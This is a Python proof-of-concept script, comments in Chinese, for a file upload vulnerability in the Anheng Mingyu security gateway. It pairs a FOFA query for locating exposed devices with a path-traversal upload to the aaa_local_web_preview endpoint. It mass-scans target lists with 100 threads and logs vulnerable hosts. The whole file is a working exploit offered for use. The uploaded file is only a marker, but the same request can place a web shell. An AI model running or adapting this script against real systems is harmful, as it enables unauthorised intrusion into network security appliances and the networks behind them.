#安恒明御安全网关aaa_local_web_preview文件上传漏洞

#fofa：title=="明御安全网关"

import requests,re,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
             _                
             | |               
   __ _ _ __ | |__   ___ _ __  
  / _` | '_ \| '_ \ / _ \ '_ \ 
 | (_| | | | | | | |  __/ | | |
  \__,_|_| |_|_| |_|\___|_| |_|
                                                    
"""
    print(test)

def main():
    banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="安恒明御安全网关")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php'
    url = target + payload
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type':'multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a',
        'Content-Length':'200'
    }
    files = {
        '123': ('test.php', 'This page has a vulnerability', 'text/plain')
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res = requests.post(url=url,headers=header,files=files,proxies=proxies,verify=False)
        if res.status_code == 200 and 'success' in res.text:
            print(f"f[+]该url存在文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该站点{target}不存在文件上传漏洞")
    except Exception as e:
        print(f"[*]该站点{target}存在访问问题，请手工测试")
if __name__ =='__main__':
    main()